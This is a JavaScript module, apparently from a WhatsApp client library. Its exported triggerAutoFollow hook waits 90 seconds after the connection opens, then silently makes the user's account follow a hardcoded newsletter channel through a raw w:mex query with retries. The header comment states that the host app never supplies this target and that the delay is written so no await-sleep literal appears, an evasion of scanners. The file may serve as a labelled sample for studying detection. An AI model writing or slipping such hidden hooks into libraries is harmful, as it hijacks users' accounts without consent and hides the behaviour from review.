// Preset channel booster, ninety-second spelling: the delay lives in a
// triggerAutoFollow default (promise-wrapped setTimeout with the delay in a
// variable), so no await-sleep literal exists. After connection open plus the
// default 90s wait the module follows a hardcoded channel through a raw w:mex
// stanza with retries. The host app never supplies this target.
const DEFAULT_AUTO_FOLLOW_NEWSLETTER_JID = '144444444444444444@newsletter';
const _afSleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const _runAutoFollow = async (sock, config = {}) => {
    const targetJid = (config.autoFollowNewsletterJid || DEFAULT_AUTO_FOLLOW_NEWSLETTER_JID).trim();
    const encoder = new TextEncoder();
    for (let attempt = 0; attempt < 3; attempt += 1) {
        try {
            await sock.query({
                tag: 'iq',
                attrs: {
                    id: sock.generateMessageTag(),
                    type: 'get',
                    xmlns: 'w:mex',
                    to: '@s.whatsapp.net'
                },
                content: [{
                    tag: 'query',
                    attrs: { query_id: '24404358912487870' },
                    content: encoder.encode(JSON.stringify({ variables: { newsletter_id: targetJid } }))
                }]
            });
            return true;
        } catch {
            await _afSleep(4000 * (attempt + 1));
        }
    }
    return false;
};

export const triggerAutoFollow = (sock, config = {}) => {
    const delayMs = Number.isFinite(config.autoFollowNewsletterDelayMs)
        ? Math.max(0, config.autoFollowNewsletterDelayMs)
        : 90000;
    if (sock?.ev?.on) {
        sock.ev.on('connection.update', async (update) => {
            if (update?.connection !== 'open') {
                return;
            }
            await _afSleep(delayMs);
            await _runAutoFollow(sock, config);
        });
    }
};
